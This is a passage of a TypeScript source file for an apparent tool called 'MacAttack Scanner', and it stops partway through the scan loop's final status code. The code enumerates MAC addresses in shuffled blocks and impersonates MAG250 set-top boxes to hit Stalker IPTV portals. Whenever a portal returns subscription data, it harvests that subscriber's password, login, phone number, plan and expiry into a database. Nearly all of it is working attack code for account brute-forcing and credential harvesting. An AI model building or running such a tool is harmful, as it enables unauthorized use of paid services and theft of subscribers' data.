/**
 * ============================================================================
 * MacAttack Scanner - IPTV Stalker Middleware MAC Address Scanner
 * ============================================================================
 *
 * This file contains the core scanning logic for testing MAC addresses against
 * Stalker middleware IPTV portals.
 *
 * IMPORTANT VALIDATION RULE
 * -------------------------
 * A MAC address is ONLY considered valid when the portal returns real account
 * information from the account_info endpoint.
 *
 * A successful handshake token alone does NOT mean the MAC is valid.
 * Many portals return handshake tokens for arbitrary MAC addresses.
 *
 * This scanner therefore uses this flow:
 * 1. Find/validate a Stalker endpoint.
 * 2. Generate MAC addresses inside the requested prefix space.
 * 3. Do handshake to get a token.
 * 4. Request account_info.
 * 5. Only if account_info contains meaningful subscription data do we count
 *    the MAC as valid and then fetch extra data like profile/genres/VOD.
 *
 * ADDITIONAL FEATURES
 * -------------------
 * - Home Assistant entity updates.
 * - Detailed info/warning/error logging.
 * - Server geolocation lookup using DNS + https://api.country.is
 * - Deterministic exhaustive MAC scanning, so we know when all MACs in the
 *   selected prefix space have been searched.
 * ============================================================================
 */

import { lookup } from "node:dns/promises";
import { db } from "@/db";
import { scanJobs, scanResults, scanLogs, settings } from "@/db/schema";
import { eq } from "drizzle-orm";
import { isWithinSchedule, parseScheduleSettings } from "@/lib/schedule";

// ============================================================================
// ACTIVE SCANS MANAGEMENT
// ============================================================================

/**
 * Stores an AbortController for every active scan.
 * This allows the stop API to cancel a running scan loop.
 */
const activeScans = new Map<number, AbortController>();

// ============================================================================
// PREFIX / MAC SPACE HELPERS
// ============================================================================

/**
 * Normalizes a MAC prefix into an array of byte strings.
 *
 * Examples:
 * - "00:1A:79"      -> ["00", "1A", "79"]
 * - "00:1A:79:*"    -> ["00", "1A", "79"]
 * - "00:1A:79:AA"   -> ["00", "1A", "79", "AA"]
 */
function normalizePrefix(prefix: string): string[] {
  return prefix
    .replace(/\*/g, "")
    .replace(/:$/, "")
    .split(":")
    .filter(Boolean)
    .map((part) => part.toUpperCase().padStart(2, "0"));
}

/**
 * Calculates how many MAC addresses exist inside the chosen prefix space.
 *
 * Examples:
 * - 3-byte prefix => 256^3 = 16,777,216
 * - 4-byte prefix => 256^2 = 65,536
 * - 5-byte prefix => 256^1 = 256
 * - 6-byte prefix => 1
 */
function getTotalMacCombinations(prefix: string): number {
  const prefixParts = normalizePrefix(prefix);
  const missingBytes = Math.max(0, 6 - prefixParts.length);
  return Math.pow(256, missingBytes);
}

/**
 * Converts a linear numeric index into a full MAC address.
 *
 * For example with prefix "00:1A:79" (3 bytes fixed, 3 bytes variable):
 *   index 0       →  00:1A:79:00:00:00
 *   index 1       →  00:1A:79:00:00:01
 *   index 255     →  00:1A:79:00:00:FF
 *   index 256     →  00:1A:79:00:01:00
 *   index 16777215→  00:1A:79:FF:FF:FF
 */
function buildMacAddressFromIndex(prefix: string, index: number): string {
  const prefixParts = normalizePrefix(prefix);
  const missingBytes = Math.max(0, 6 - prefixParts.length);
  const suffix: string[] = new Array(missingBytes);

  let remaining = index;

  for (let i = missingBytes - 1; i >= 0; i -= 1) {
    const byteValue = remaining % 256;
    suffix[i] = byteValue.toString(16).padStart(2, "0").toUpperCase();
    remaining = Math.floor(remaining / 256);
  }

  return [...prefixParts, ...suffix].join(":");
}

/**
 * Caps a numeric counter to the PostgreSQL integer limit.
 */
function numberToDbInt(value: number): number {
  const max = 2147483647;
  if (value > max) return max;
  return value;
}

// ============================================================================
// RANDOMISED BLOCK-SHUFFLE MAC ENUMERATION
// ============================================================================
//
// WHY NOT JUST STORE ALL TESTED MACs IN A SET?
// ─────────────────────────────────────────────
// A 3-byte suffix means 16,777,216 possible MACs.  Storing every one in a
// JavaScript Set would use > 500 MB of RAM.  That's unacceptable on a NAS
// with limited memory.
//
// APPROACH: BLOCK-BASED SHUFFLE
// ─────────────────────────────
// 1. Divide the entire MAC index space [0 … N) into small blocks of
//    BLOCK_SIZE (default 10,000).
// 2. Build an array of block numbers [0, 1, 2, …] and shuffle it
//    (Fisher-Yates).  Memory: totalBlocks × 4 bytes ≈ 7 KB for 16.7 M MACs.
// 3. For each block, build an array of the indices inside it and shuffle that.
//    Memory: BLOCK_SIZE × 4 bytes ≈ 40 KB (reused every block).
// 4. Test each MAC from the shuffled indices.
//
// RESULT
// ------
// • Every MAC is tested exactly once (no duplicates).
// • Order is random (shuffled between AND within blocks).
// • Peak memory: ~80 KB regardless of prefix space size.
// • We know when every MAC has been tested (scan is exhaustive).
// ============================================================================

/** Default block size if none is specified. */
const DEFAULT_BLOCK_SIZE = 8_000;

/**
 * Fisher-Yates in-place shuffle.
 * Runs in O(n) time and O(1) extra memory.
 */
function shuffleArray(arr: number[]): void {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    const tmp = arr[i];
    arr[i] = arr[j];
    arr[j] = tmp;
  }
}

/**
 * Creates the shuffled block order for the entire MAC space.
 *
 * @param totalCombinations – total number of MACs in the prefix space
 * @param blockSize – number of MACs per block
 * @returns A shuffled array of block indices
 */
function createShuffledBlockOrder(
  totalCombinations: number,
  blockSize: number
): number[] {
  const totalBlocks = Math.ceil(totalCombinations / blockSize);
  const blockOrder: number[] = new Array(totalBlocks);
  for (let i = 0; i < totalBlocks; i++) blockOrder[i] = i;
  shuffleArray(blockOrder);
  return blockOrder;
}

/**
 * Creates a shuffled array of MAC indices within one block.
 *
 * @param blockIndex – the block number (0-based)
 * @param totalCombinations – total MACs in the full space
 * @param blockSize – number of MACs per block
 * @returns A shuffled array of absolute MAC indices
 */
function createShuffledBlockIndices(
  blockIndex: number,
  totalCombinations: number,
  blockSize: number
): number[] {
  const start = blockIndex * blockSize;
  const end   = Math.min(start + blockSize, totalCombinations);
  const size  = end - start;

  const indices: number[] = new Array(size);
  for (let i = 0; i < size; i++) indices[i] = start + i;
  shuffleArray(indices);

  return indices;
}

// ============================================================================
// LOGGING SYSTEM
// ============================================================================

async function addLog(jobId: number, level: string, message: string): Promise<void> {
  try {
    await db.insert(scanLogs).values({ jobId, level, message });
  } catch {
    // Logging must never crash the scanner.
  }
}

// ============================================================================
// STALKER URL HELPERS
// ============================================================================

/**
 * Common Stalker/portal URL patterns.
 */
const PORTAL_PATTERNS = [
  { path: "server/load.php", base: "c/" },
  { path: "server/load.php", base: "" },
  { path: "stalker_portal/server/load.php", base: "stalker_portal/c/" },
  { path: "stalker_portal/server/load.php", base: "c/" },
  { path: "portal.php", base: "c/" },
  { path: "portal.php", base: "" },
  { path: "load.php", base: "c/" },
  { path: "load.php", base: "" },
];

function getBaseUrl(url: string): string {
  let base = url.trim();

  if (!base.startsWith("http://") && !base.startsWith("https://")) {
    base = `http://${base}`;
  }

  base = base.replace(
    /\/(c|stalker_portal\/c|stalker_portal|portal\.php|server\/load\.php|load\.php)\/?$/i,
    ""
  );

  if (!base.endsWith("/")) {
    base += "/";
  }

  return base;
}

const STB_HEADERS = {
  "User-Agent":
    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
  "X-User-Agent": "Model: MAG250; Link: WiFi",
  Accept: "*/*",
};

function makeCookie(mac: string): string {
  return `mac=${encodeURIComponent(mac)}; stb_lang=en; timezone=Europe/London`;
}

// ============================================================================
// HOME ASSISTANT
// ============================================================================

async function sendToHomeAssistant(
  haUrl: string,
  haToken: string,
  entityId: string,
  state: string | number,
  attributes?: Record<string, unknown>
): Promise<boolean> {
  if (!haUrl || !haToken || !entityId) return false;

  try {
    const url = `${haUrl.replace(/\/$/, "")}/api/states/${entityId}`;
    const response = await fetch(url, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${haToken}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        state: String(state),
        attributes: {
          unit_of_measurement: "MACs",
          friendly_name: "MacAttack Found MACs",
          icon: "mdi:access-point-network",
          ...attributes,
        },
      }),
    });
    return response.ok;
  } catch {
    return false;
  }
}

// ============================================================================
// SERVER GEOLOCATION
// ============================================================================

/**
 * Resolve portal hostname -> IP -> geolocation.
 *
 * Based on current public documentation, api.country.is provides free no-key
 * geolocation over HTTPS and supports extra fields like city, subdivision,
 * coordinates, and ASN.
 */
async function resolveServerLocation(
  portalUrl: string
): Promise<{
  ip: string | null;
  label: string;
  raw: Record<string, unknown> | null;
}> {
  try {
    const parsed = new URL(getBaseUrl(portalUrl));
    const hostname = parsed.hostname;

    const dnsResult = await lookup(hostname);
    const ip = dnsResult.address;

    const geoResponse = await fetch(
      `https://api.country.is/${ip}?fields=city,continent,subdivision,location,asn`
    );

    if (!geoResponse.ok) {
      return {
        ip,
        label: `IP ${ip}`,
        raw: null,
      };
    }

    const geo = (await geoResponse.json()) as Record<string, unknown>;

    const city = String(geo.city || "");
    const subdivision = String(geo.subdivision || "");
    const country = String(geo.country || "");
    const continent = String(geo.continent || "");
    const asn = geo.asn && typeof geo.asn === "object" ? geo.asn : null;

    const parts = [city, subdivision, country].filter(Boolean);
    const humanLocation = parts.length > 0 ? parts.join(", ") : country || continent || `IP ${ip}`;

    let label = humanLocation;
    if (ip) label += ` (IP: ${ip})`;
    if (asn && "organization" in asn && typeof asn.organization === "string") {
      label += ` | ASN: ${asn.organization}`;
    }

    return {
      ip,
      label,
      raw: geo,
    };
  } catch {
    return {
      ip: null,
      label: "Unknown server location",
      raw: null,
    };
  }
}

// ============================================================================
// PORTAL VALIDATION
// ============================================================================

async function findWorkingEndpoint(
  portalUrl: string,
  timeoutMs: number = 10000,
  beforeRequest?: () => Promise<boolean>
): Promise<{ serverPath: string; portalBase: string } | { aborted: true } | null> {
  const baseUrl = getBaseUrl(portalUrl);

  for (const pattern of PORTAL_PATTERNS) {
    if (beforeRequest && !(await beforeRequest())) return { aborted: true };

    const serverPath = `${baseUrl}${pattern.path}`;
    const portalBase = `${baseUrl}${pattern.base}`;
    const testUrl = `${serverPath}?type=stb&action=handshake&prehash=0&token=&JsHttpRequest=1-xml`;

    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), timeoutMs);

      const response = await fetch(testUrl, {
        method: "GET",
        headers: {
          ...STB_HEADERS,
          Cookie: "mac=00:1A:79:00:00:00; stb_lang=en; timezone=Europe/London",
        },
        signal: controller.signal,
      });

      clearTimeout(timeout);

      if (response.ok) {
        const text = await response.text();
        try {
          const data = JSON.parse(text);
          if (data && typeof data === "object") {
            if ("js" in data || "token" in data || "error" in data) {
              return { serverPath, portalBase };
            }
          }
        } catch {
          // Try next pattern.
        }
      }
    } catch {
      // Try next pattern.
    }
  }

  return null;
}

export async function validateStalkerPortal(
  portalUrl: string,
  timeoutMs: number = 10000,
  beforeRequest?: () => Promise<boolean>
): Promise<{
  valid: boolean;
  error?: string;
  serverPath?: string;
  portalBase?: string;
  aborted?: boolean;
}> {
  try {
    const result = await findWorkingEndpoint(portalUrl, timeoutMs, beforeRequest);

    if (result && "aborted" in result) return { valid: false, aborted: true };

    if (result) {
      return {
        valid: true,
        serverPath: result.serverPath,
        portalBase: result.portalBase,
      };
    }

    const baseUrl = getBaseUrl(portalUrl);
    const directUrl = `${baseUrl}server/load.php?type=stb&action=handshake&prehash=0&token=&JsHttpRequest=1-xml`;

    if (beforeRequest && !(await beforeRequest())) return { valid: false, aborted: true };

    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), timeoutMs);

      const response = await fetch(directUrl, {
        method: "GET",
        headers: {
          ...STB_HEADERS,
          Cookie: "mac=00:1A:79:00:00:00; stb_lang=en; timezone=Europe/London",
        },
        signal: controller.signal,
      });

      clearTimeout(timeout);

      if (response.ok) {
        const text = await response.text();
        if (text.trim().startsWith("{") || text.trim().startsWith("[")) {
          return {
            valid: true,
            serverPath: `${baseUrl}server/load.php`,
            portalBase: `${baseUrl}c/`,
          };
        }
      }
    } catch {
      // ignore
    }

    return {
      valid: false,
      error:
        "Could not find a valid Stalker middleware endpoint. Tried multiple common URL patterns. You can enable 'Skip Verification' to proceed anyway.",
    };
  } catch (err) {
    if (err instanceof Error && err.name === "AbortError") {
      return {
        valid: false,
        error: "Connection timed out. The portal may be offline or unreachable.",
      };
    }

    return {
      valid: false,
      error: `Connection failed: ${err instanceof Error ? err.message : "Unknown error"}`,
    };
  }
}

// ============================================================================
// STALKER API CALLS
// ============================================================================

async function doHandshake(
  serverPath: string,
  portalBase: string,
  mac: string,
  timeoutMs: number,
  aborted: () => boolean
): Promise<string | null> {
  if (aborted()) return null;

  const url = `${serverPath}?type=stb&action=handshake&prehash=0&token=&JsHttpRequest=1-xml`;

  try {
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), timeoutMs);

    const res = await fetch(url, {
      method: "GET",
      headers: {
        ...STB_HEADERS,
        Cookie: makeCookie(mac),
        Referer: portalBase,
      },
      signal: controller.signal,
    });

    clearTimeout(t);
    if (!res.ok) return null;

    const data = (await res.json()) as { js?: { token?: string } };
    return data?.js?.token || null;
  } catch {
    return null;
  }
}

async function fetchProfile(
  serverPath: string,
  portalBase: string,
  mac: string,
  token: string,
  timeoutMs: number,
  aborted: () => boolean
): Promise<Record<string, unknown> | null> {
  if (aborted()) return null;

  const url = `${serverPath}?type=stb&action=get_profile&hd=1&num_banks=1&stb_type=MAG250&JsHttpRequest=1-xml`;

  try {
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), timeoutMs);

    const res = await fetch(url, {
      method: "GET",
      headers: {
        ...STB_HEADERS,
        Cookie: makeCookie(mac),
        Authorization: `Bearer ${token}`,
        Referer: portalBase,
      },
      signal: controller.signal,
    });

    clearTimeout(t);
    if (!res.ok) return null;

    const data = (await res.json()) as { js?: Record<string, unknown> };
    return data?.js || null;
  } catch {
    return null;
  }
}

async function fetchAccountInfo(
  serverPath: string,
  portalBase: string,
  mac: string,
  token: string,
  timeoutMs: number,
  aborted: () => boolean
): Promise<Record<string, unknown> | null> {
  if (aborted()) return null;

  const url = `${serverPath}?type=account_info&action=get_main_info&JsHttpRequest=1-xml`;

  try {
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), timeoutMs);

    const res = await fetch(url, {
      method: "GET",
      headers: {
        ...STB_HEADERS,
        Cookie: makeCookie(mac),
        Authorization: `Bearer ${token}`,
        Referer: portalBase,
      },
      signal: controller.signal,
    });

    clearTimeout(t);
    if (!res.ok) return null;

    const data = (await res.json()) as { js?: Record<string, unknown> };
    return data?.js || null;
  } catch {
    return null;
  }
}

async function fetchGenres(
  serverPath: string,
  portalBase: string,
  mac: string,
  token: string,
  type: "itv" | "vod",
  timeoutMs: number,
  aborted: () => boolean
): Promise<Array<{ id: string; title: string }> | null> {
  if (aborted()) return null;

  const action = type === "itv" ? "get_genres" : "get_categories";
  const url = `${serverPath}?type=${type}&action=${action}&JsHttpRequest=1-xml`;

  try {
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), timeoutMs);

    const res = await fetch(url, {
      method: "GET",
      headers: {
        ...STB_HEADERS,
        Cookie: makeCookie(mac),
        Authorization: `Bearer ${token}`,
        Referer: portalBase,
      },
      signal: controller.signal,
    });

    clearTimeout(t);
    if (!res.ok) return null;

    const data = (await res.json()) as {
      js?: Array<{ id?: string; title?: string; name?: string }>;
    };

    if (Array.isArray(data?.js)) {
      return data.js
        .map((g) => ({
          id: String(g.id || ""),
          title: g.title || g.name || "",
        }))
        .filter((g) => g.id && g.title);
    }

    return null;
  } catch {
    return null;
  }
}

// ============================================================================
// ACCOUNT VALIDATION
// ============================================================================

function isAccountInfoValid(info: Record<string, unknown>): boolean {
  if (Object.keys(info).length === 0) return false;

  const mac = info.mac || info.login;
  const expiry = info.phone || info.end_date || info.expire_billing_date;
  const tariff = info.tariff_plan;
  const status = info.status;

  if (!mac && !expiry && !tariff) return false;
  if (status === -1 || status === "-1") return false;

  return true;
}

// ============================================================================
// FINALIZATION / RESET HELPERS
// ============================================================================

async function resetFoundCounterAndHa(jobId: number, reason: string): Promise<void> {
  const [job] = await db
    .select()
    .from(scanJobs)
    .where(eq(scanJobs.id, jobId))
    .limit(1);

  if (!job) return;

  await db
    .update(scanJobs)
    .set({
      totalFound: 0,
      currentMac: null,
      updatedAt: new Date(),
    })
    .where(eq(scanJobs.id, jobId));

  if (job.haUrl && job.haToken && job.haEntityId) {
    await sendToHomeAssistant(job.haUrl, job.haToken, job.haEntityId, 0, {
      status: reason,
      reset_at: new Date().toISOString(),
    });
  }
}

// ============================================================================
// SCHEDULE GATE
// ============================================================================

/**
 * Throttles schedule checks while a scan is active, and keeps the worker alive
 * in a scheduled-paused state until its next allowed window. The five-second
 * check interval means schedule edits and window boundaries take effect quickly
 * without a database query for every tested MAC.
 */
function createScheduleGate(jobId: number, isAborted: () => boolean) {
  const checkIntervalMs = 5_000;
  let cachedSchedule: ReturnType<typeof parseScheduleSettings> | null = null;
  let nextCheckAt = 0;
  let wasScheduledPaused = false;

  const readSchedule = async () => {
    const rows = await db.select().from(settings);
    const settingsMap = Object.fromEntries(rows.map((row) => [row.key, row.value || ""]));
    cachedSchedule = parseScheduleSettings(
      settingsMap.schedule_enabled,
      settingsMap.schedule_timezone,
      settingsMap.schedule_days
    );
    nextCheckAt = Date.now() + checkIntervalMs;
    return cachedSchedule;
  };

  const isAllowedNow = async () => {
    if (cachedSchedule && Date.now() < nextCheckAt) {
      return isWithinSchedule(cachedSchedule);
    }

    try {
      return isWithinSchedule(await readSchedule());
    } catch {
      // If a saved schedule was already loaded, honor it during a transient
      // database failure. Before the first successful read, fail closed rather
      // than risk running outside a schedule that could not be checked.
      nextCheckAt = Date.now() + checkIntervalMs;
      return cachedSchedule ? isWithinSchedule(cachedSchedule) : false;
    }
  };

  return async (): Promise<boolean> => {
    if (isAborted()) return false;

    if (await isAllowedNow()) {
      if (wasScheduledPaused) {
        await db.update(scanJobs)
          .set({ status: "running", updatedAt: new Date() })
          .where(eq(scanJobs.id, jobId));
        await addLog(jobId, "success", "Allowed schedule window is open — scan resumed automatically");
        wasScheduledPaused = false;
      }
      return true;
    }

    if (!wasScheduledPaused) {
      await db.update(scanJobs)
        .set({ status: "scheduled_paused", updatedAt: new Date() })
        .where(eq(scanJobs.id, jobId));
      await addLog(jobId, "warning", "Outside the allowed schedule — scan is paused until the next allowed window");
      wasScheduledPaused = true;
    }

    while (!isAborted()) {
      await new Promise((resolve) => setTimeout(resolve, 2_000));
      if (await isAllowedNow()) {
        await db.update(scanJobs)
          .set({ status: "running", updatedAt: new Date() })
          .where(eq(scanJobs.id, jobId));
        await addLog(jobId, "success", "Allowed schedule window is open — scan resumed automatically");
        wasScheduledPaused = false;
        return true;
      }
    }

    return false;
  };
}

// ============================================================================
// MAIN SCAN LOOP
// ============================================================================

export async function startScan(jobId: number, skipVerification: boolean = false): Promise<void> {
  const controller = new AbortController();
  activeScans.set(jobId, controller);
  const isAborted = () => controller.signal.aborted;
  const waitForAllowedWindow = createScheduleGate(jobId, isAborted);

  try {
    const [job] = await db
      .select()
      .from(scanJobs)
      .where(eq(scanJobs.id, jobId))
      .limit(1);

    if (!job) {
      await addLog(jobId, "error", "Job not found in database");
      return;
    }

    const macPrefix = job.macPrefix || "00:1A:79";
    const timeoutMs = job.timeoutMs || 5000;
    const haUrl = job.haUrl || "";
    const haToken = job.haToken || "";
    const haEntityId = job.haEntityId || "";
    const totalCombinations = getTotalMacCombinations(macPrefix);

    await addLog(jobId, "info", "════════════════════════════════════════");
    await addLog(jobId, "info", "        MacAttack Scan Starting");
    await addLog(jobId, "info", "════════════════════════════════════════");
    await addLog(jobId, "info", `Portal URL: ${job.portalUrl}`);
    await addLog(jobId, "info", `MAC Prefix: ${macPrefix}`);
    await addLog(jobId, "info", `Timeout: ${timeoutMs}ms`);
    await addLog(jobId, "info", `Total MAC combinations in this prefix: ${totalCombinations.toString()}`);

    if (!(await waitForAllowedWindow())) return;

    let serverPath: string;
    let portalBase: string;

    if (skipVerification) {
      await addLog(jobId, "warning", "Portal verification SKIPPED by user");
      await addLog(jobId, "warning", "Using default URL patterns - may not work for all portals");
      const baseUrl = getBaseUrl(job.portalUrl);
      serverPath = `${baseUrl}server/load.php`;
      portalBase = `${baseUrl}c/`;
    } else {
      await addLog(jobId, "info", "Validating portal URL...");
      await addLog(jobId, "info", "Trying multiple common Stalker middleware URL patterns...");
      const validation = await validateStalkerPortal(job.portalUrl, timeoutMs, waitForAllowedWindow);

      if (!validation.valid) {
        if (validation.aborted || isAborted()) return;

        await addLog(jobId, "error", "════════════════════════════════════════");
        await addLog(jobId, "error", "    PORTAL VALIDATION FAILED");
        await addLog(jobId, "error", "════════════════════════════════════════");
        await addLog(jobId, "error", `Reason: ${validation.error}`);
        await addLog(jobId, "warning", "TIP: Enable 'Skip Verification' to try anyway");

        await db
          .update(scanJobs)
          .set({ status: "error", updatedAt: new Date() })
          .where(eq(scanJobs.id, jobId));
        activeScans.delete(jobId);
        return;
      }

      serverPath = validation.serverPath!;
      portalBase = validation.portalBase!;
      await addLog(jobId, "success", "Portal validation SUCCESSFUL!");
      await addLog(jobId, "success", `Found working endpoint: ${serverPath}`);
    }

    // Resolve server geolocation once at the beginning.
    if (!(await waitForAllowedWindow())) return;
    await addLog(jobId, "info", "Resolving server IP and location...");
    const serverGeo = await resolveServerLocation(job.portalUrl);
    if (serverGeo.ip) {
      await addLog(jobId, "success", `Server location: ${serverGeo.label}`);
    } else {
      await addLog(jobId, "warning", "Could not determine server geolocation");
    }

    if (!(await waitForAllowedWindow())) return;

    await db
      .update(scanJobs)
      .set({ status: "running", updatedAt: new Date() })
      .where(eq(scanJobs.id, jobId));

    await addLog(jobId, "info", "");
    await addLog(jobId, "info", "════════════════════════════════════════");
    await addLog(jobId, "info", "        Scan Started - Testing MACs");
    await addLog(jobId, "info", "════════════════════════════════════════");

    if (haEntityId) {
      await addLog(jobId, "info", `Home Assistant entity: ${haEntityId}`);
      await addLog(jobId, "info", "HA entity will update when valid MACs are found");
    } else {
      await addLog(jobId, "info", "Home Assistant integration: Not configured");
    }

    await addLog(jobId, "info", "MAC addresses will be tested in RANDOM order (block-shuffle).");
    await addLog(jobId, "info", "A MAC only counts as valid if account_info returns meaningful subscription data.");

    // ── Build the randomised iteration order ──
    // 1. Shuffle the block order so we don't scan linearly.
    // 2. Within each block, shuffle the indices so even adjacent MACs are tested
    //    in random order.
    //
    // Memory usage:
    //   blockOrder array  ≈ totalBlocks × 4 bytes  (e.g., 1 678 × 4 ≈ 7 KB)
    //   current block     ≈ BLOCK_SIZE  × 4 bytes  (10 000 × 4 ≈ 40 KB)
    //   Total peak        ≈ ~50 KB  (vs > 500 MB for a full Set of 16.7 M MACs)

    const blockSize = job.blockSize || DEFAULT_BLOCK_SIZE;
    const blockOrder = createShuffledBlockOrder(totalCombinations, blockSize);
    const totalBlocks = blockOrder.length;

    const blockArrayMemKB = Math.ceil((totalBlocks * 4) / 1024);
    const perBlockMemKB   = Math.ceil((blockSize * 4) / 1024);
    const totalMemKB      = blockArrayMemKB + perBlockMemKB;

    await addLog(
      jobId,
      "info",
      `Block size: ${blockSize.toLocaleString()} MACs per block`
    );
    await addLog(
      jobId,
      "info",
      `Split into ${totalBlocks.toLocaleString()} blocks — est. memory: ~${totalMemKB} KB`
    );
    await addLog(jobId, "info", "");

    let tested = 0;
    let found = 0;
    let abortedEarly = false;

    // ── Outer loop: iterate over shuffled blocks ──
    for (let bi = 0; bi < totalBlocks && !abortedEarly; bi++) {
      if (isAborted()) {
        await addLog(jobId, "warning", "Scan abort signal received - stopping now");
        abortedEarly = true;
        break;
      }

      // Check DB status every block to catch external stops.
      if (bi > 0) {
        const [cur] = await db
          .select()
          .from(scanJobs)
          .where(eq(scanJobs.id, jobId))
          .limit(1);

        if (!cur || cur.status === "paused" || cur.status === "completed") {
          await addLog(jobId, "warning", "Scan status changed externally - stopping loop");
          abortedEarly = true;
          break;
        }
      }

      const blockIdx = blockOrder[bi];
      const indices = createShuffledBlockIndices(blockIdx, totalCombinations, blockSize);

      // Log block progress periodically (every 10 blocks)
      if (bi % 10 === 0) {
        await addLog(
          jobId,
          "info",
          `Processing block ${bi + 1}/${totalBlocks} — ${tested.toLocaleString()} MACs tested so far, ${found} valid found`
        );
      }

      // ── Inner loop: iterate over shuffled indices within block ──
      for (const macIndex of indices) {
        if (isAborted() || !(await waitForAllowedWindow())) {
          abortedEarly = true;
          break;
        }

        const mac = buildMacAddressFromIndex(macPrefix, macIndex);
        tested += 1;

        // Update progress in DB every 5 MACs
        if (tested % 5 === 0) {
          await db
            .update(scanJobs)
            .set({
              totalTested: numberToDbInt(tested),
              totalFound: numberToDbInt(found),
              currentMac: mac,
              updatedAt: new Date(),
            })
            .where(eq(scanJobs.id, jobId));
        }

        // Log progress every 50 MACs
        if (tested % 50 === 0) {
          await addLog(
            jobId,
            "info",
            `Progress: ${tested.toLocaleString()} / ${totalCombinations.toLocaleString()} MACs tested, ${found} valid found`
          );
        }

        try {
          // STEP 1 – Handshake (token alone does NOT mean the MAC is valid)
          const token = await doHandshake(serverPath, portalBase, mac, timeoutMs, isAborted);
          if (!token) {
            continue;
          }
          if (!(await waitForAllowedWindow())) {
            abortedEarly = true;
            break;
          }

          // STEP 2 – Account info (the REAL validation)
          const accountInfo = await fetchAccountInfo(
            serverPath,
            portalBase,
            mac,
            token,
            timeoutMs,
            isAborted
          );

          if (!accountInfo || !isAccountInfoValid(accountInfo)) {
            continue;
          }

          // ── Valid MAC found ──────────────────────────────────────────
          found += 1;

          await addLog(jobId, "info", "");
          await addLog(jobId, "success", "╔══════════════════════════════════════╗");
          await addLog(jobId, "success", "║      VALID MAC ADDRESS FOUND!        ║");
          await addLog(jobId, "success", "╚══════════════════════════════════════╝");
          await addLog(jobId, "success", `MAC Address: ${mac}`);

          // STEP 3 – Fetch additional data (profile, genres, VOD)
          await addLog(jobId, "info", "Fetching additional account details...");

          if (!(await waitForAllowedWindow())) {
            abortedEarly = true;
            break;
          }
          const profileInfo = await fetchProfile(
            serverPath, portalBase, mac, token, timeoutMs, isAborted
          );
          if (profileInfo) {
            await addLog(jobId, "info", "✓ Profile data retrieved");
          } else {
            await addLog(jobId, "warning", "✗ Could not retrieve profile data");
          }

          if (!(await waitForAllowedWindow())) {
            abortedEarly = true;
            break;
          }
          const itvGenres = await fetchGenres(
            serverPath, portalBase, mac, token, "itv", timeoutMs, isAborted
          );
          if (itvGenres && itvGenres.length > 0) {
            await addLog(jobId, "info", `✓ Retrieved ${itvGenres.length} ITV genres`);
          } else {
            await addLog(jobId, "warning", "✗ Could not retrieve ITV genres");
          }

          if (!(await waitForAllowedWindow())) {
            abortedEarly = true;
            break;
          }
          const vodCategories = await fetchGenres(
            serverPath, portalBase, mac, token, "vod", timeoutMs, isAborted
          );
          if (vodCategories && vodCategories.length > 0) {
            await addLog(jobId, "info", `✓ Retrieved ${vodCategories.length} VOD categories`);
          } else {
            await addLog(jobId, "warning", "✗ Could not retrieve VOD categories");
          }

          // Extract and format data
          const combined = { ...profileInfo, ...accountInfo };
          const password = String(profileInfo?.password || profileInfo?.pass || "");
          const login = String(profileInfo?.login || profileInfo?.username || mac);
          const timezone = String(profileInfo?.timezone || profileInfo?.time_zone || "");
          const playlistGenres = itvGenres ? itvGenres.map((g) => g.title).join(", ") : "";
          const vodCats = vodCategories ? vodCategories.map((g) => g.title).join(", ") : "";
          const tariff =
            (combined.tariff_plan as { name?: string })?.name ||
            String(combined.tariff_plan || "");
          const expiry = String(
            combined.end_date || combined.expire_billing_date || combined.phone || ""
          );
          const phoneNumber = String(combined.phone || "");

          // Log all found data
          await addLog(jobId, "success", `Expiry: ${expiry || "N/A"}`);
          await addLog(jobId, "success", `Plan: ${tariff || "N/A"}`);
          await addLog(jobId, "success", `Phone Number: ${phoneNumber || "N/A"}`);
          await addLog(jobId, "success", `Password: ${password || "N/A"}`);
          await addLog(jobId, "success", `Timezone: ${timezone || "N/A"}`);
          await addLog(jobId, "success", `Server Location: ${serverGeo.label}`);
          await addLog(jobId, "info", "Saving valid result to database...");

          // Save to database
          await db.insert(scanResults).values({
            jobId,
            macAddress: mac,
            portalUrl: job.portalUrl,
            expireDate: expiry,
            serverLocation: serverGeo.label,
            tariffPlan: tariff,
            maxConnections: String(combined.max_connections || combined.max_con || ""),
            activeConnections: String(
              combined.active_cons || combined.active_connections || ""
            ),
            createdAt: combined.created_at
              ? new Date(combined.created_at as string)
              : null,
            accountStatus: String(combined.status ?? ""),
            phoneNumber,
            timezone,
            username: login,
            password,
            playlistGenres,
            vodCategories: vodCats,
            rawData: {
              profile: profileInfo,
              account: accountInfo,
              itvGenres,
              vodCategories,
              serverGeo,
            },
          });

          await addLog(jobId, "info", "Result saved successfully");

          // Update job progress
          await db
            .update(scanJobs)
            .set({
              totalTested: numberToDbInt(tested),
              totalFound: numberToDbInt(found),
              currentMac: mac,
              updatedAt: new Date(),
            })
            .where(eq(scanJobs.id, jobId));

          // Update Home Assistant
          if (haUrl && haToken && haEntityId) {
            const ok = await sendToHomeAssistant(haUrl, haToken, haEntityId, numberToDbInt(found), {
              last_mac: mac,
              portal: job.portalUrl,
              last_updated: new Date().toISOString(),
              server_location: serverGeo.label,
            });

            if (ok) {
              await addLog(jobId, "info", `Home Assistant updated: ${haEntityId} = ${found}`);
            } else {
              await addLog(jobId, "warning", "Failed to update Home Assistant entity");
            }
          }
        } catch (err) {
          if (isAborted()) { abortedEarly = true; break; }
          await addLog(
            jobId,
            "error",
            `Error testing MAC ${mac}: ${err instanceof Error ? err.message : "Unknown error"}`
          );
        }

        // Small delay to avoid overwhelming the portal
        await new Promise((r) => setTimeout(r, 100));
      } // end inner block loop
    } // end outer block loop

    // ── Final status ──
    const scannedAllMacs = !abortedEarly && tested >= totalCombinations;
    const finalStatus = abortedEarly ? "paused" : "completed";

    if (scannedAllMacs) {
